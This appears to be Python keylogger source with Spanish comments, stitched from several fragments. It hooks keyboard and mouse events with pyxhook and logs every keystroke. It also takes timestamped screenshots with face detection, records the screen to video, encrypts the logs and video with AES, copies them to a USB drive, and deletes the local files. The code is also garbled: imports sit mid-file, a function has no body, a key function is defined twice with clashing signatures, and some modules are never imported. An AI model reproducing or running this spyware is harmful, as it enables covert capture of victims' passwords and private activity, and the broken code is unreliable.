#para capturar la pantalla
def capture_screen():
    #capturar la pantalla
    image = pyautogui.screenshot()
    #guardar la imagen
    image.save("screenshot.png")
    #leer la imagen
    img = cv2.imread("screenshot.png")
    #convertir a escala de grises
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    #detectar caras
    faces = face_cascade.detectMultiScale(gray, 1.3, 5)
    #dibujar rectangulos
    for (x,y,w,h) in faces:
        cv2.rectangle(img,(x,y),(x+w,y+h),(255,0,0),2)
        roi_gray = gray[y:y+h, x:x+w]
        roi_color = img[y:y+h, x:x+w]
    #guardar la imagen
    cv2.imwrite('screenshot.png', img)
    #convertir a base64
    with open("screenshot.png", "rb") as imageFile:
        return base64.b64encode(imageFile.read())

log_file = 'registro.txt'  # nombre de archivo para guardar el registro
usb_path = 'F:\\'  # ruta del USB donde se almacenará la información
keylogger_size = os.path.getsize(__file__)

def OnKeyPress(event):
    now = datetime.datetime.now()
    with open(log_file, 'a') as f:
        f.write('{} [KEYPRESS]\t{}\t{}\n'.format(now, event.Key, event.Ascii))

    # Capturar imagen de la pantalla con sello de tiempo
    screenshot_path = os.path.join(usb_path, 'screenshots', 'screenshot_{}.png'.format(now.strftime('%Y%m%d_%H%M%S')))
    pyautogui.screenshot(screenshot_path)

def OnMouseMove(event):
    now = datetime.datetime.now()
    with open(log_file, 'a') as f:
        f.write('{} [MOUSEMOVE]\t{}\t{}\n'.format(now, event.Position[0], event.Position[1]))

    # Capturar imagen de la pantalla con sello de tiempo
    screenshot_path = os.path.join(usb_path, 'screenshots', 'screenshot_{}.png'.format(now.strftime('%Y%m%d_%H%M%S')))
    pyautogui.screenshot(screenshot_path)

def generate_key(password, salt=b'salt_'):
    kdf = PBKDF2(password, salt, dkLen=32, count=100000)
    return kdf

# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

def encrypt_file(key, input_file, output_file):
    with open(input_file, 'rb') as f:
        data = f.read()

    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))

    with open(output_file, 'wb') as f:
        f.write(encrypted_data)

encrypt_file(b"1234567890123456", "prueba.txt", "prueba.enc")


def record_screenshots():
    screenshots_path = os.path.join(usb_path, 'screenshots')
    os.makedirs(screenshots_path, exist_ok=True)

    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    video_path = os.path.join(usb_path, 'screen_record.mp4')
    video_out = cv2.VideoWriter(video_path, fourcc, 5.0, (1920, 1080))

    while True:
        now = datetime.datetime.now()
        screenshot_file = os.path.join(screenshots_path, 'screenshot_{}.png'.format(now.strftime('%Y%m%d_%H%M%S')))
        pyautogui.screenshot(screenshot_file)
        image = cv2.imread(screenshot_file)
        video_out.write(image)

        time.sleep(5)  # Grabar una captura de pantalla cada 5 segundos

        # Encriptar el archivo de video y guardarlo
        key = generate_key('password_for_video_encryption')
        encrypt_file(key, video_path, video_path + '.encrypted')

        # Mover el archivo cifrado al destino original
        shutil.move(video_path + '.encrypted', video_path)

#!/usr/bin/env python3
import shutil
import time
import os
import sys
import subprocess
import os.path
from os import path
from datetime import datetime
import logging
import logging.handlers
import random
import string
import re
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
from datetime import datetime
import base64

#USB_PATH = "/media/usb0/"
USB_PATH = "/media/pi/USB/"

LOG_FILE = "log.txt"
ENCRYPTED_LOG_FILE = "encrypted_log.txt"
KEY_FILE = "key.txt"

def encrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>.enc' will be used.

        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = Random.new().read(AES.block_size)
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def decrypt_file(key, in_filename, out_filename=None, chunksize=24 * 1024):
    """ Decrypts a file using AES (CBC mode) with the
        given key. Parameters are similar to encrypt_file,
        with one difference: out_filename, if not supplied
        will be in_filename without its last extension
        (i.e. if in_filename is 'aaa.zip.enc' then
        out_filename will be 'aaa.zip')
    """
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)

def generate_key():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

def get_hash(text):

# Configurar el keylogger
hook_manager = pyxhook.HookManager()
hook_manager.KeyDown = OnKeyPress
hook_manager.MouseMovement = OnMouseMove
hook_manager.HookKeyboard()
hook_manager.HookMouse()
hook_manager.start()

# Esperar a que se inserte el USB
while not os.path.exists(usb_path):
    pass

# Verificar espacio en la memoria USB
usb_stats = shutil.disk_usage(usb_path)
if usb_stats.free > keylogger_size:
    # Obtener clave de encriptación
    key = generate_key('password_for_encryption')

    # Encriptar el archivo de registro
    encrypted_log_file = os.path.join(usb_path, 'registro_encrypted.txt')
    encrypt_file(key, log_file, encrypted_log_file)

    # Crear archivo ZIP comprimido con el archivo de registro encriptado y el hash
    with zipfile.ZipFile(os.path.join(usb_path, 'registro_encrypted.zip'), 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(encrypted_log_file)

    # Eliminar archivo de registro local y el archivo encriptado
    os.remove(log_file)
    os.remove(encrypted_log_file)

    # Iniciar el proceso de grabación de capturas de pantalla cada cierto tiempo
    record_screenshots()
else:
    print("Espacio insuficiente en el USB.")
